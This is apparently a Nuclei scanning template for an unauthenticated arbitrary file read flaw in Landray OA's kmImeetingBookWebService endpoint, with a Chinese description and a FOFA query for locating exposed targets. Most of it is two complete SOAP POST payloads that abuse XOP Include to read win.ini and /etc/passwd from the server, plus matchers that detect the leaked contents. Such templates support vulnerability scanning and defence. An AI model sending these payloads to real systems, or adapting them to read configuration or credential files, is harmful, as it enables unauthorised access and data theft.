id: Landray-WebService-kmImeetingBookWebService-File-reading

info:
  name: "蓝凌 OA WebService kmImeetingBookWebService 接口任意文件读取漏洞"
  author: Unknown
  severity: high
  description: |-
    fofa: body="Com_Parameter"
      蓝凌OA WebService kmImeetingBookWebService 接口存在文件访问控制缺陷，攻击者可通过构造恶意请求绕过系统验证机制，读取任意路径下的敏感文件（如数据库配置文件、系统配置文件等）。该漏洞无需身份认证即可利用，可能直接暴露系统关键信息，导致横向渗透攻击和数据泄露风险。
  reference:
  - https://mp.weixin.qq.com/s/wRBjZLTi65ZLH42IklPuBw?token=1066715859&lang=zh_CN
  tags: 蓝凌OA


http:
- raw:
  - |
    POST /sys/webservice/kmImeetingBookWebService HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
    Connection: close
    Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
    SOAPAction: ""
    Accept-Encoding: gzip, deflate

    ------4upt9dwdca8rtwq9osuz
    Content-Disposition: form-data; name="a"

    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.imeeting.km.kmss.landray.com/">
    <soapenv:Header/>
    <soapenv:Body>
        <web:getImeetingBookLists>
            <arg0>
                <beginTimeStamp>a</beginTimeStamp>
                <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
            </arg0>
        </web:getImeetingBookLists>
    </soapenv:Body>
    </soapenv:Envelope>
    ------4upt9dwdca8rtwq9osuz--
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0'
    - 'Unmarshalling Error: 意外的文本'
    condition: and
  - type: status
    status:
    - 500
- raw:
  - |
    POST /sys/webservice/kmImeetingBookWebService HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
    Connection: close
    Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
    SOAPAction: ""
    Accept-Encoding: gzip, deflate

    ------4upt9dwdca8rtwq9osuz
    Content-Disposition: form-data; name="a"

    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.imeeting.km.kmss.landray.com/">
    <soapenv:Header/>
    <soapenv:Body>
        <web:getImeetingBookLists>
            <arg0>
                <beginTimeStamp>a</beginTimeStamp>
                <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/></count>
            </arg0>
        </web:getImeetingBookLists>
    </soapenv:Body>
    </soapenv:Envelope>
    ------4upt9dwdca8rtwq9osuz--
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'cm9vdDov'
    - 'L2Jpbi9iYXNo'
    - 'Unmarshalling Error: 意外的文本'
    condition: and
  - type: status
    status:
    - 500

